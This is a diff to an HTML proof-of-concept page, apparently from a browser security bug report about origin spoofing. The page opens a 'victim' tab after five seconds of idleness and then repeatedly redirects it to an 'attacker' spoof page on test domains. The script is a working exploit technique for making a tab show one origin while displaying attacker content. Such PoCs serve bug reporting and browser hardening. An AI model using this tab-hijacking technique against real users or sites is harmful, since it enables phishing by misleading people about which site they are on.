@@ -1,6 +1,30 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Idle Trigger Example</title>
+</head>
 <body>
-	<iframe src='https://attacker--poc--intent-paint--origin-spoof.cr.vuln.foo/'></iframe>
+    <h1>Welcome to the idle-trigger test!</h1>
+    <p>Wait for 5 seconds without interacting with this page...</p>
+
+    <script>
+        setTimeout(() => {
+            // Attempt to open the spoofed tab
+            const win = window.open('https://victim--poc--intent-paint--origin-spoof.cr.vuln.foo', '_blank');
+
+            if (win) {
+                const spoof = () => {
+                    win.location.href = 'https://attacker--poc--intent-paint--origin-spoof.cr.vuln.foo/spoof.html';
+                };
+
+                setTimeout(spoof, 500); 
+                setInterval(spoof, 2000); 
+            } else {
+                console.error('Popup was blocked! Ensure popups are allowed for this page.');
+            }
+        }, 5000); 
+    </script>
 </body>
 </html>
